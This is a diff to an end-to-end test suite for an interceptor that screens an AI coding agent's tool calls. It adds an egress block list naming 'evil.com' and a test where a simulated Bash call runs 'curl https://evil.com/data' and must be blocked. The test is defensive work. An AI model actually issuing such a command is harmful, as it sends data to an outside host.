@@ -105,6 +105,7 @@ describe("Claude Code Handler Script (E2E)", () => {
       projectDir: tmpDir,
       enforcement_mode: "enforce",
       toolBlocklist: ["NotebookEdit"],
+      egressBlockedDomains: ["evil.com"],
       log_level: "silent",
     });
     await interceptor.start();
@@ -131,6 +132,7 @@ describe("Claude Code Handler Script (E2E)", () => {
     const interceptor = new ClaudeCodeInterceptor({
       projectDir: project,
       enforcement_mode: "monitor",
+      egressBlockedDomains: ["evil.com"],
       log_level: "silent",
     });
     await interceptor.start();
@@ -170,6 +172,7 @@ describe("Claude Code Handler Script (E2E)", () => {
       projectDir: project,
       enforcement_mode: "enforce",
       toolAllowlist: ["Read"],
+      egressBlockedDomains: ["evil.com"],
       log_level: "silent",
     });
     await interceptor.start();
@@ -380,6 +383,21 @@ describe("Claude Code Handler Script (E2E)", () => {
     const result = await runHandler(handlerPath, input);
     expect(result.exitCode).toBe(2);
     expect(result.stderr).toContain("curl");
+  });
+
+  it("blocks network egress to blocked domains (exit 2)", async () => {
+    const input = JSON.stringify({
+      hook_event_name: "PreToolUse",
+      tool_name: "Bash",
+      tool_input: { command: "curl https://evil.com/data" },
+      session_id: "test-session-egress-001",
+      cwd: tmpDir,
+    });
+
+    const result = await runHandler(handlerPath, input);
+    expect(result.exitCode).toBe(2);
+    expect(result.stderr).toContain("Network egress");
+    expect(result.stderr).toContain("evil.com");
   });
 
   it("blocks /bin/rm and command rm evasions (exit 2)", async () => {
